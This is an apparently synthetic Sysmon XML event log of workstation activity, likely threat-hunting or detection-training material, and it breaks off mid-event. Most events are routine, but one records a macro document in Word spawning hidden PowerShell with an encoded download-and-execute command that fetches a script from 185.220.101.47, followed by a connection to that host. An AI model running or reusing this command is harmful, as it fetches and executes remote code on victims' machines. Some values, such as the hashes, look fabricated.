<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T08:06:21.7642734Z"/>
    <EventRecordID>117205</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 08:06:21.764</Data>
    <Data Name="ProcessGuid">{d94d5049-33b0-668e-a0dd-363a5ab57541}</Data>
    <Data Name="ProcessId">8404</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Host Process for Windows Services</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">svchost.exe</Data>
    <Data Name="CommandLine">"C:\Windows\System32\svchost.exe" -k netsvcs -p</Data>
    <Data Name="CurrentDirectory">C:\Users\xdavis\</Data>
    <Data Name="User">CORP\xdavis</Data>
    <Data Name="LogonGuid">{5c172e80-708b-668e-0f3d-29457ba9b51a}</Data>
    <Data Name="LogonId">0xb3c087</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=BDEAEF236E709AED4E8A32C0BE13B553,SHA256=66CC1068ED2470F8C337F4E3AC176FB4BC387EC7100F7F998AE89831EC5D4CA9</Data>
    <Data Name="ParentProcessGuid">{a6ee97b8-19fc-668e-5a6b-1323a5aad5ee}</Data>
    <Data Name="ParentProcessId">9444</Data>
    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\services.exe"</Data>
    <Data Name="ParentUser">CORP\xdavis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T08:20:15.4656372Z"/>
    <EventRecordID>117184</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-005.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 08:20:15.465</Data>
    <Data Name="ProcessGuid">{4ba0fdec-0517-668e-4537-2f12acd64ff5}</Data>
    <Data Name="ProcessId">6666</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\wclark\</Data>
    <Data Name="User">CORP\wclark</Data>
    <Data Name="LogonGuid">{f9a24045-02fb-668e-9b82-c8f4218cd4ea}</Data>
    <Data Name="LogonId">0x27259f</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=03B5CE88517C1FA9660BF476C0D128AE,SHA256=474CF28A3E03B13DFF404B24134B4774E086FA53ABA32D6E2950EAE93959E7D5</Data>
    <Data Name="ParentProcessGuid">{f62859bd-53fc-668e-993d-07650f00a215}</Data>
    <Data Name="ParentProcessId">8365</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\wclark</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T08:57:36.3182053Z"/>
    <EventRecordID>117180</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 08:57:36.318</Data>
    <Data Name="ProcessGuid">{c0a2c87a-67ec-668e-83ec-eed10c879ae7}</Data>
    <Data Name="ProcessId">2747</Data>
    <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">whoami - displays logged on user information</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">whoami.exe</Data>
    <Data Name="CommandLine">whoami.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\uwilliams\</Data>
    <Data Name="User">CORP\uwilliams</Data>
    <Data Name="LogonGuid">{95f1eb9f-d333-668e-1ffc-9eb9bdae4e45}</Data>
    <Data Name="LogonId">0x3085bb</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=C69A80608CBD0DC5D264DF1EEEEBE16D,SHA256=4C7FE5E221E7B34D551D5965767146788C0C0C870CB46AECA4924A7F11C88A9F</Data>
    <Data Name="ParentProcessGuid">{2f717758-deaf-668e-8a30-9819e632bc0a}</Data>
    <Data Name="ParentProcessId">3345</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    <Data Name="ParentUser">CORP\uwilliams</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T08:58:08.4346936Z"/>
    <EventRecordID>117231</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 08:58:08.434</Data>
    <Data Name="ProcessGuid">{8ef32a42-e182-668e-0f33-d329c88c2371}</Data>
    <Data Name="ProcessId">7687</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Host Process for Windows Services</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">svchost.exe</Data>
    <Data Name="CommandLine">"C:\Windows\System32\svchost.exe" -k netsvcs -p</Data>
    <Data Name="CurrentDirectory">C:\Users\dsingh\</Data>
    <Data Name="User">CORP\dsingh</Data>
    <Data Name="LogonGuid">{55cf1dcd-04db-668e-66be-2d9c43006f00}</Data>
    <Data Name="LogonId">0x664fd7</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=E17F1DD751F17884DF9ED5DB1F98ACAE,SHA256=4DFCB8253E8FFB0169A4415D5C7164C8B5BE7701E81C7A2DA448ECFB34A6F01B</Data>
    <Data Name="ParentProcessGuid">{eb959f6a-57ff-668e-9fe0-1f34a75a3520}</Data>
    <Data Name="ParentProcessId">5224</Data>
    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\services.exe"</Data>
    <Data Name="ParentUser">CORP\dsingh</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T09:02:14.2745521Z"/>
    <EventRecordID>117195</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 09:02:14.274</Data>
    <Data Name="ProcessGuid">{233390a2-75a3-668e-e099-e1bd081ce39e}</Data>
    <Data Name="ProcessId">8445</Data>
    <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">whoami - displays logged on user information</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">whoami.exe</Data>
    <Data Name="CommandLine">whoami.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\ogarcia\</Data>
    <Data Name="User">CORP\ogarcia</Data>
    <Data Name="LogonGuid">{7737c925-c920-668e-c075-deb721bfc721}</Data>
    <Data Name="LogonId">0x69d48f</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=20CA9D35A7C1C9018E9CE9C882E07C30,SHA256=1EE02EF7FA9661E332E3D1180528992BADE87779DAB573F067B70195CCB6C3FE</Data>
    <Data Name="ParentProcessGuid">{620638bc-8af4-668e-4eaf-81e8076e88e0}</Data>
    <Data Name="ParentProcessId">3494</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    <Data Name="ParentUser">CORP\ogarcia</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T09:06:57.3479197Z"/>
    <EventRecordID>117133</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-017.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 09:06:57.347</Data>
    <Data Name="ProcessGuid">{fb116198-2191-668e-872b-cca26a6386f9}</Data>
    <Data Name="ProcessId">2539</Data>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Google Chrome</Data>
    <Data Name="Product">Google Chrome</Data>
    <Data Name="Company">Google LLC</Data>
    <Data Name="OriginalFileName">chrome.exe</Data>
    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
    <Data Name="User">CORP\mrodriguez</Data>
    <Data Name="LogonGuid">{23bcdd32-fceb-668e-665d-2f1a0a6b68b2}</Data>
    <Data Name="LogonId">0xd3f3cb</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=BDAE4B7B77595CC43EFA12A8DDF60604,SHA256=A65E5FCD78A2B15A4B9D370E60F40E75FFFE3394A4FC6010E2421484699F61BF</Data>
    <Data Name="ParentProcessGuid">{eab16103-cac9-668e-e3fe-81214e3c6f3d}</Data>
    <Data Name="ParentProcessId">8118</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\mrodriguez</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T09:07:52.9871234Z"/>
    <EventRecordID>117884</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-017.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
    <Data Name="UtcTime">2026-07-10 09:07:52.987</Data>
    <Data Name="ProcessGuid">{7f1d4a2c-1097-668e-2400-000000000b02}</Data>
    <Data Name="ProcessId">6712</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA</Data>
    <Data Name="CurrentDirectory">C:\Users\mrodriguez\Downloads\</Data>
    <Data Name="User">CORP\mrodriguez</Data>
    <Data Name="LogonGuid">{7f1d4a2c-0871-668e-1c9a-000000000001}</Data>
    <Data Name="LogonId">0x1c9a01</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=91A2B3C4D5E6F708192A3B4C5D6E7F80,SHA256=1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F80</Data>
    <Data Name="ParentProcessGuid">{7f1d4a2c-1091-668e-2300-000000000b02}</Data>
    <Data Name="ParentProcessId">6180</Data>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\mrodriguez\Downloads\Invoice_7742.docm"</Data>
    <Data Name="ParentUser">CORP\mrodriguez</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T09:08:05.4410009Z"/>
    <EventRecordID>117278</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-017.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 09:08:05.441</Data>
    <Data Name="ProcessGuid">{7f1d4a2c-1097-668e-2400-000000000b02}</Data>
    <Data Name="ProcessId">8835</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">CORP\mrodriguez</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.10.17.55</Data>
    <Data Name="SourceHostname">WKSTN-017.corp.local</Data>
    <Data Name="SourcePort">49504</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">185.220.101.47</Data>
    <Data Name="DestinationHostname">-</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationPortName">https</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T09:24:11.7634842Z"/>
    <EventRecordID>117208</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 09:24:11.763</Data>
    <Data Name="ProcessGuid">{7725c430-a70f-668e-255d-11447ee85e1a}</Data>
    <Data Name="ProcessId">1193</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Get-Process</Data>
    <Data Name="CurrentDirectory">C:\Users\lwong\</Data>
    <Data Name="User">CORP\lwong</Data>
    <Data Name="LogonGuid">{0d8e48a5-be6e-668e-e8ff-80e08dafee1d}</Data>
    <Data Name="LogonId">0xb14b9f</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=24E494C144C2C83E00A6F2D1ACC062CC,SHA256=9FB24E63584B7B82C02280E03F0CF3B51FE31F91977DBECE49D21A22101F13FB</Data>
    <Data Name="ParentProcessGuid">{9afe541c-6450-668e-25d1-98ddba48fd0d}</Data>
    <Data Name="ParentProcessId">4762</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Process</Data>
    <Data Name="ParentUser">CORP\lwong</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:01:02.6767386Z"/>
    <EventRecordID>117168</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:01:02.676</Data>
    <Data Name="ProcessGuid">{af486e34-b29a-668e-51a0-4c0c1905580d}</Data>
    <Data Name="ProcessId">6826</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\lwong\</Data>
    <Data Name="User">CORP\lwong</Data>
    <Data Name="LogonGuid">{d726c1d4-4023-668e-6c08-f8e20606a38a}</Data>
    <Data Name="LogonId">0xa2bd93</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=7599238E1B79E47B2DF61A74CF08CDAC,SHA256=45B55503647B61DAD9DFDF0C8A7F88AFA427B62FABA5F8E8229C5DEA33FD8A78</Data>
    <Data Name="ParentProcessGuid">{b9f8eca1-082a-668e-dc86-13cabd47fecb}</Data>
    <Data Name="ParentProcessId">7607</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\lwong</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:02:05.0125356Z"/>
    <EventRecordID>117211</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-088.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:02:05.012</Data>
    <Data Name="ProcessGuid">{fbf8ea7d-ae98-668e-5b4c-85192c93b6e9}</Data>
    <Data Name="ProcessId">5082</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Outlook</Data>
    <Data Name="Product">Microsoft Office</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">OUTLOOK.EXE</Data>
    <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"</Data>
    <Data Name="CurrentDirectory">C:\Users\zwalker\</Data>
    <Data Name="User">CORP\zwalker</Data>
    <Data Name="LogonGuid">{116ac591-be88-668e-a0d6-58b7a4e33321}</Data>
    <Data Name="LogonId">0x034899</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=B28DDA7527BD361E680144D84BF40AA9,SHA256=5F3429F88E9C0957E3F8F528D2E5FA18B45DEDEEFA98A8E92780346D0AD5EA26</Data>
    <Data Name="ParentProcessGuid">{1b267e7e-dcec-668e-3c0a-af2e91b9c288}</Data>
    <Data Name="ParentProcessId">4971</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\zwalker</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:17:11.2129437Z"/>
    <EventRecordID>117248</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:17:11.212</Data>
    <Data Name="ProcessGuid">{c10a9c2e-53b1-668e-a40b-7a62638bd0a7}</Data>
    <Data Name="ProcessId">1466</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\pnguyen\</Data>
    <Data Name="User">CORP\pnguyen</Data>
    <Data Name="LogonGuid">{3d4726f2-301c-668e-495d-bed6abfe9b4d}</Data>
    <Data Name="LogonId">0x201697</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=6946F4A9954A6A32E50A178AB75F508E,SHA256=CFDCC14F9AE241FA626CB63B4C431F92887030C289B4C9BE98662F33B7778E5D</Data>
    <Data Name="ParentProcessGuid">{94744302-4887-668e-3828-0f786ef49143}</Data>
    <Data Name="ParentProcessId">5940</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\pnguyen</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:34:22.7310160Z"/>
    <EventRecordID>117235</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-005.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:34:22.731</Data>
    <Data Name="ProcessGuid">{7e47f55a-6317-668e-7f10-946816e08667}</Data>
    <Data Name="ProcessId">2573</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Word</Data>
    <Data Name="Product">Microsoft Office</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">WINWORD.EXE</Data>
    <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"</Data>
    <Data Name="CurrentDirectory">C:\Users\rpatel\</Data>
    <Data Name="User">CORP\rpatel</Data>
    <Data Name="LogonGuid">{43bf7e5d-90a6-668e-4e6d-b684617ee662}</Data>
    <Data Name="LogonId">0x3109dc</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=B0753BDBB204A0CDDC1CE79FDF29D74B,SHA256=207A594FC543ABC7E96D78A906BA9DBDB62F1F6114204E6CC75BCE65569E862D</Data>
    <Data Name="ParentProcessGuid">{6368bc24-bf08-668e-e7e3-b3fdc0c9bb99}</Data>
    <Data Name="ParentProcessId">1375</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\rpatel</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:36:28.5041403Z"/>
    <EventRecordID>117229</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-088.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
